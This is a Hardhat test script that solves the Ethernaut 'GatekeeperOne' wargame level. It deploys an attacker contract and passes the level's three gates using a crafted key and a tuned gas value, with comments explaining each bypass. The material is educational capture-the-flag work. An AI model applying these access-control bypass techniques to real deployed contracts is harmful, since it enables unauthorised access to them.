const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("GatekeeperOne", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("GatekeeperOne", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // We bypass the first gate by executing the transaction through contract
        // Then in the contract we specify that only 8191 gas will be sent to the `enter` function
        // Finally, since 16 bits = 2 bytes our gateKey should be equal to the rightmost bytes of the player's address

        // Notice: in order to bypass the `gateThree part two` we should change a major byte in the gate key (in position 0-3)

        const mod = 8191;
        let gateKey = "0x".concat(player.address.slice(player.address.length - 2 * 2).padStart(8 * 2, "0"));

        // Change a random major byte
        gateKey = gateKey.replace("0x0", "0x1");

        const attacker = await (await ethers.getContractFactory("GatekeeperOneAttack")).connect(player).deploy();

        // Loop through posible gas limit scenarios (for the `gateTwo`)
        for (let gas = 196; gas < 197; gas++) {
            try {
                await attacker.connect(player).attack(instance.address, gateKey, mod * 3 + gas, { gasLimit: "1000000" });
                break;
            } catch (err) {
                throw err;
            }
        }
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});